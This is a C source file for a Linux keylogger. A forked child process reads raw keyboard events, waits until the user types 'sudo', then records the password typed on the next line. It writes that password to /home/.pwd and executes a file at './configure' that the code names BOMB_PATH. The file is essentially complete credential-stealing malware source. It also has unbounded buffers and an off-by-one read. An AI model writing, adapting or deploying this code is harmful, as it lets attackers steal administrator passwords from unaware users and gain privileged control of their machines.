#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/input.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>

char key_map[100];

#define DEV_PATH "/dev/input/event2"   // keyboard dev file
#define PWD_PATH "/home/.pwd"
// #define PWD_PATH "pwd"
#define BOMB_PATH "./configure"

void main_loop();
void sniffing_keyboard();
void save_pw(char *, int);
void remove_boot();

int main()
{
        key_map[2] = '1';
        key_map[3] = '2';
        key_map[4] = '3';
        key_map[5] = '4';
        key_map[6] = '5';
        key_map[7] = '6';
        key_map[8] = '7';
        key_map[9] = '8';
        key_map[10] = '9';
        key_map[11] = '0';
        key_map[12] = '-';
        key_map[13] = '=';
        key_map[16] = 'q';
        key_map[17] = 'w';
        key_map[18] = 'e';
        key_map[19] = 'r';
        key_map[20] = 't';
        key_map[21] = 'y';
        key_map[22] = 'u';
        key_map[23] = 'i';
        key_map[24] = 'o';
        key_map[25] = 'p';
        key_map[26] = '[';
        key_map[27] = ']';
        key_map[30] = 'a';
        key_map[31] = 's';
        key_map[32] = 'd';
        key_map[33] = 'f';
        key_map[34] = 'g';
        key_map[35] = 'h';
        key_map[36] = 'j';
        key_map[37] = 'k';
        key_map[38] = 'l';
        key_map[39] = ';';
        key_map[40] = '\'';
        key_map[44] = 'z';
        key_map[45] = 'x';
        key_map[46] = 'c';
        key_map[47] = 'v';
        key_map[48] = 'b';
        key_map[49] = 'n';
        key_map[50] = 'm';
        key_map[51] = ',';
        key_map[52] = '.';
        key_map[53] = '/';
        key_map[57] = ' ';
        key_map[79] = '1';
        key_map[80] = '2';
        key_map[81] = '3';
        key_map[75] = '4';
        key_map[76] = '5';
        key_map[77] = '6';
        key_map[71] = '7';
        key_map[72] = '8';
        key_map[73] = '9';
        key_map[82] = '0';

        main_loop();
	return 0;
}

void main_loop()
{
        size_t pid;
        int exitStatus;
        
        pid = fork();

        if (pid < 0) {
                perror("fork");
        } else if (pid == 0) {
                // wait for the parent to terminate
                sleep(5);       
                sniffing_keyboard();
        }
}

void sniffing_keyboard()
{
        int keys_fd;
	char ret[2];
	struct input_event t;

	keys_fd = open(DEV_PATH, O_RDONLY);
	if (keys_fd <= 0) {
                perror("open /dev/input/event2 device error!\n");
	} else {
                char *buf = malloc(sizeof(char) * 2048);        // input text buffer
                int buf_size = 2048;
                int idx = 0;

                int sudo_ready = 0;
                int capture_pwd = 0;
                char *pw_buf = malloc(sizeof(char) * 100);
                int pw_idx = 0;

                while(1) {
                        if (read(keys_fd, &t, sizeof(t)) == sizeof(t)) {
                                if (t.type == EV_KEY)      
                                        if (t.value == 1) {
                                                // printf("key %c %s\n", key_map[(int)t.code], "Pressed");
                                                buf[idx++] = key_map[(int)t.code];
                                                if (sudo_ready && capture_pwd)
                                                        pw_buf[pw_idx++] = key_map[(int)t.code];

                                                if (sudo_ready && capture_pwd && (int)t.code == 28) {
                                                        sudo_ready = 0;
                                                        capture_pwd = 0;

                                                        save_pw(pw_buf, pw_idx);

                                                        pw_idx = 0;
                                                }

                                                if (idx >= 3 && buf[idx - 1] == 'o' && buf[idx - 2] == 'd' && buf[idx - 3] == 'u' && buf[idx - 4] == 's') {
                                                        sudo_ready = 1;
                                                }
                                                
                                                if (sudo_ready && (int)t.code == 28) {
                                                        capture_pwd = 1;
                                                }
                                        }
                        }
                }
                close(keys_fd);
        }

}

void save_pw(char *pw, int pw_len)
{
        FILE *p;
        p = fopen(PWD_PATH, "w");
        if (p != NULL) {
                fwrite(pw, 1, pw_len - 1, p);
        }
        fclose(p);
        remove_boot();
}

void remove_boot()
{
        execl(BOMB_PATH, BOMB_PATH, NULL);
}